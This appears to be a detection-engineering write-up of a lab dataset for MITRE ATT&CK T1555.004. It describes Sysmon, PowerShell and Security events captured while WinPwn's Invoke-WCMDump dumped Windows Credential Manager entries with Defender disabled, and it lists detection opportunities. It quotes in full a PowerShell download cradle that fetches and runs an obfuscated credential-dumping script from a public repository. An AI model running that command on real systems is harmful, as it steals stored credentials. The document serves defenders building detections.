# T1555.004-2: Windows Credential Manager — WinPwn - Loot Local Credentials - Invoke-WCMDump

## Technique Context

MITRE ATT&CK T1555.004 (Windows Credential Manager) covers techniques that enumerate and dump credentials stored in the Windows Credential Manager (also called the Windows Vault). The Credential Manager stores network passwords, web credentials, and certificate-based credentials in the user's profile. WinPwn's `Invoke-WCMDump` function reads Windows Credential Manager entries programmatically using the `CredEnumerate` Win32 API rather than the `VaultCmd.exe` LOLBin. This represents a more invasive and typically more capable approach than `VaultCmd`, capable of recovering decrypted credential values rather than just metadata.

With Defender disabled, `Invoke-WCMDump` can download and execute without AMSI interception. The full credential enumeration logic executes against the Windows Vault.

## What This Dataset Contains

This dataset was captured on ACME-WS06 (Windows 11 Enterprise, domain acme.local) on 2026-03-17 with Defender disabled, spanning approximately 2 seconds. It contains 144 events across three channels: 28 Sysmon, 112 PowerShell, and 4 Security.

**Command executed (Security EID=4688):**
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring(
  'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump}
```
The full command line appears verbatim in Security EID=4688 and Sysmon EID=1. The download URL points to an obfuscated version of the WCMDump payload at S3cur3Th1sSh1t's `Creds` repository. Running as `NT AUTHORITY\SYSTEM` from `C:\Windows\TEMP\`.

**PowerShell EID=4104:** 106 script block events. With Defender disabled, the WinPwn/WCMDump download cradle and the obfuscated `Invoke-WCMDump` payload content are evaluated by PowerShell and logged as script blocks. This contrasts sharply with the defended dataset where AMSI blocked the payload and only 41 events (mostly boilerplate) were captured.

**Sysmon EID=8 (CreateRemoteThread):** One EID=8 event showing `powershell.exe` (PID 14256) creating a remote thread in another process (PID 17664, `TargetImage: <unknown process>`), tagged `technique_id=T1055,technique_name=Process Injection`. StartAddress: `0x00007FF658E64EB0`. The `<unknown process>` target image indicates the target process exited before Sysmon could resolve its name — a transient process created by the WCMDump execution.

**Sysmon EID=10 (Process Access):** Three EID=10 events at `GrantedAccess: 0x1FFFFF`, tagged `T1055.001`, showing PowerShell accessing child processes.

**Sysmon EID=1 (Process Create):** Three process creations including `whoami.exe` instances (tagged T1033) and the child PowerShell executing the download cradle (tagged T1059.001). Note: no additional processes spawned by WCMDump itself appear, as WCMDump operates entirely within the PowerShell process.

**Sysmon EID=11 (File Created):** Two file creation events: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` and `StartupProfileData-Interactive` — standard SYSTEM-context PowerShell startup artifacts.

**Sysmon EID=17 (Pipe Created):** Two named pipe events from PowerShell console host infrastructure.

**Security EID=4688:** Four process creation events (SYSTEM context) capturing the WCMDump download cradle command line and `whoami.exe` instances.

## What This Dataset Does Not Contain

**Credential output in logs.** `Invoke-WCMDump` calls `CredEnumerate` and outputs results to stdout — which is not captured by any of the logging channels in this dataset. The SYSTEM account may have Credential Manager entries from domain authentication, but those are not visible as file writes or security events in this telemetry.

**Windows Credential Manager access events (Security EID=5379/5381).** Unlike T1555.003-15 (WebBrowserPassView), no EID=5379 or EID=5381 appears in this dataset. WCMDump uses the `CredEnumerate` API directly — these events may require specific audit subcategory configuration that is not active in this environment, or WCMDump's API usage pattern does not trigger the same audit event path as the NirSoft utility.

**DLL loads for WCMDump's credential access.** WCMDump operates in-process within PowerShell using P/Invoke to call `advapi32.dll`'s `CredEnumerate`. The DLL is already loaded into PowerShell at startup, so no new EID=7 load event appears.

**Comparison with the defended variant:** In the defended dataset (sysmon: 33, security: 9, powershell: 41), AMSI blocked the payload before the credential-reading logic could run. The PowerShell event count was 41 (almost entirely boilerplate) versus 112 here. The Sysmon EID=8 (CreateRemoteThread) is present in both datasets, indicating this injection pattern occurs as part of the download cradle evaluation even when the final payload is blocked. The key difference in the undefended dataset is that the `Invoke-WCMDump` script block and the obfuscated DumpWCM.ps1 content are preserved in the 106 EID=4104 events.

## Assessment

This dataset provides substantially more PowerShell telemetry than the defended variant. The obfuscated WCMDump payload evaluates fully with Defender disabled, populating 106 EID=4104 events with content that was completely absent in the defended run. The `Invoke-WCMDump` function call and the download URL referencing an obfuscated payload path are the key technique-specific indicators.

The Sysmon EID=8 (CreateRemoteThread to unknown process) is worth noting: this event appears in both the defended and undefended runs, suggesting it is generated by the download cradle or an intermediary stage rather than the WCMDump payload itself.

## Detection Opportunities Present in This Data

**PowerShell EID=4104 — download cradle with DumpWCM.ps1 URL:** The URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1` is a specific IOC. Combined with the `Invoke-WCMDump` function call in the same script block, this is a high-confidence indicator.

**PowerShell EID=4104 — Invoke-WCMDump function call:** The function name appears verbatim in the script block log. `Invoke-WCMDump` references in script block content are a reliable indicator of WCM credential access intent.

**PowerShell EID=4104 — obfuscated payload content:** The DumpWCM.ps1 payload is described as obfuscated. The EID=4104 events capture the obfuscated form as downloaded — analysts can extract and hash the payload content from these events for threat intelligence correlation.

**Sysmon EID=8 — CreateRemoteThread from PowerShell to unknown process:** This event, tagged T1055, indicates thread injection occurring during the download-and-execute chain. Combined with the download cradle in EID=4104, this behavioral sequence characterizes the WinPwn execution pattern.

**Security EID=4688 — PowerShell with download cradle referencing credential-access URL:** The combination of the `net.webclient downloadstring` pattern and a URL referencing `Creds` or `DumpWCM` repositories in a process creation event is a specific detection anchor.
